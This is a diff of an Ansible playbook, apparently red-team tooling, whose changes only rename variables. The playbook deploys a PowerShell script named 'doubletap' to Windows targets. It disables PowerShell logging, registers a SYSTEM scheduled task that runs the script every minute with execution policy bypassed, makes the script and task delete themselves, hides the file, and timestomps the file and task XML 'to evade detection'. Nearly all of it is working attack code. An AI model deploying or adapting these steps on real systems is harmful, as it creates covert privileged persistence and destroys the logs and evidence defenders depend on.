@@ -1,8 +1,8 @@
 ---
-- name: Define variables for paths and filenames
-  set_fact:
-    script_dest: "C:\\Windows\\Temp\\firewall_script3.ps1"
-    task_name: "DoubleTapScript"
+#- name: Define variables for paths and filenames
+#  set_fact:
+#    doubletap_ps1_task_script_dest: "C:\\Windows\\Temp\\firewall_script3.ps1"
+#    doubletap_ps1_task_task_name: "DoubleTapScript"
 
 - name: Disable PowerShell logging by modifying the registry
   win_registry:
@@ -15,44 +15,44 @@
 - name: Copy PowerShell script to target
   win_copy:
     src: "files/doubletap.ps1"
-    dest: "{{ script_dest }}"
+    dest: "{{ doubletap_ps1_task_script_dest }}"
 
 - name: Create Scheduled Task to Run Script Every Minute
   win_shell: |
-    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File {{ script_dest }}"
+    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File {{ doubletap_ps1_task_script_dest }}"
     $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
-    Register-ScheduledTask -TaskName "{{ task_name }}" -Action $Action -Trigger $Trigger -User "SYSTEM" -RunLevel Highest -Force
+    Register-ScheduledTask -TaskName "{{ doubletap_ps1_task_task_name }}" -Action $Action -Trigger $Trigger -User "SYSTEM" -RunLevel Highest -Force
   args:
     executable: powershell.exe
 
 - name: Modify PowerShell script to self-delete task after execution
   win_lineinfile:
-    path: "{{ script_dest }}"
-    line: 'Unregister-ScheduledTask -TaskName "{{ task_name }}" -Confirm:$false'
+    path: "{{ doubletap_ps1_task_script_dest }}"
+    line: 'Unregister-ScheduledTask -TaskName "{{ doubletap_ps1_task_task_name }}" -Confirm:$false'
     insertafter: "# Cleanup after explosion"
 
 - name: Add script deletion at the end of the PowerShell script
   win_lineinfile:
-    path: "{{ script_dest }}"
+    path: "{{ doubletap_ps1_task_script_dest }}"
     line: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'
     insertafter: 'Log " My work here is done"''
 
 - name: Apply hidden and system attributes to the PowerShell script
   win_shell: |
-    attrib +h +s "{{ script_dest }}"
+    attrib +h +s "{{ doubletap_ps1_task_script_dest }}"
 
 - name: Timestomp script and task to evade detection
   win_shell: |
     $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
-    (Get-Item "{{ script_dest }}").CreationTime = $time
-    (Get-Item "{{ script_dest }}").LastWriteTime = $time
-    (Get-Item "{{ script_dest }}").LastAccessTime = $time
+    (Get-Item "{{ doubletap_ps1_task_script_dest }}").CreationTime = $time
+    (Get-Item "{{ doubletap_ps1_task_script_dest }}").LastWriteTime = $time
+    (Get-Item "{{ doubletap_ps1_task_script_dest }}").LastAccessTime = $time
   args:
     executable: powershell.exe
 
 - name: Timestomp Scheduled Task XML
   win_shell: |
-    $taskPath = "C:\\Windows\\System32\\Tasks\\{{ task_name }}"
+    $taskPath = "C:\\Windows\\System32\\Tasks\\{{ doubletap_ps1_task_task_name }}"
     if (Test-Path $taskPath) {
         $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
         (Get-Item $taskPath).CreationTime = $time
